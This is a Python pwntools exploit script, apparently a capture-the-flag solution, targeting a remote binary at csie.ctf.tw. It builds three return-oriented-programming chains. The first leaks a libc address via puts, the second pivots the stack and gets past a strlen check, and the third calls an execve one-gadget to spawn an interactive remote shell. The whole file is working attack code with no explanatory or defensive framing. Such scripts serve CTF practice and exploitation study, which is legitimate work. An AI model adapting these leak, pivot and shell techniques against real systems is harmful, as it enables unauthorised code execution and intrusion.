from pwn import *
from time import *

context.arch = 'amd64'
r = remote('csie.ctf.tw',10131)

####USEFUL ADDR
stderr_addr = 0x601060
strlen_bypasser = 0x601100
rbp_addr = 0x601060+0x280
main_stack_pad = 0x20
puts_offset = 0x809c0

####CODE_GADGETS
code_leave = 0x400818         #leave ; ret

####LIBC_GADGETS
libc_execve = 0x4f2c5
libc_pop_rcx = 0x3eb0b   # pop rcx ; ret

####ROPCHAIN1
####FAKE RBP
ropchain = b'\x90'*160
ropchain += p64(rbp_addr)
####LEAK LIBC_BASE
#ropchain+= p64(main_addr)
ropchain+= p64(0x400883)
ropchain+= p64(0x600fc8)
ropchain+= p64(0x4005e0)
####READ INPUT
ropchain+= p64(0x4007c4)
####PAD TO NEXT INSTRUCTION
ropchain+= p64(0x40068f)*27
r.sendafter('something:\n',ropchain)

####ROPCHAIN2
####STACK MIGRATION1
migrate = b'\x90'*0x20
migrate+= p64(0x601100)    #bypass strlen check by setting last byte to '\0'
migrate+= p64(code_leave)
l = [ '{:0>2x}'.format(ord(c)) for c in migrate ]
for i in range(0,len(l),8):
  print(l[i:i+8])
r.sendafter('say?\n',migrate)
r.recvuntil('~')
puts_addr = r.recv()
puts_addr = puts_addr.split(b'\n')[1]
puts_addr = u64(puts_addr.ljust(8,b'\x00'))
libc_base = puts_addr-puts_offset

print('libc_base: %x' % libc_base)

####ROPCHAIN3
####FAKE RBP
ropchain = p64(rbp_addr)
####CALL EXECVE
ropchain+= p64(0x3eb0b+libc_base)
ropchain+= p64(0x0)
ropchain+= p64(0x4f2c5+libc_base)
####STACK MIGRATION2
ropchain+= p64(rbp_addr-0x20)
ropchain+= p64(code_leave)
sleep(0.5)
r.sendline(ropchain)



r.interactive()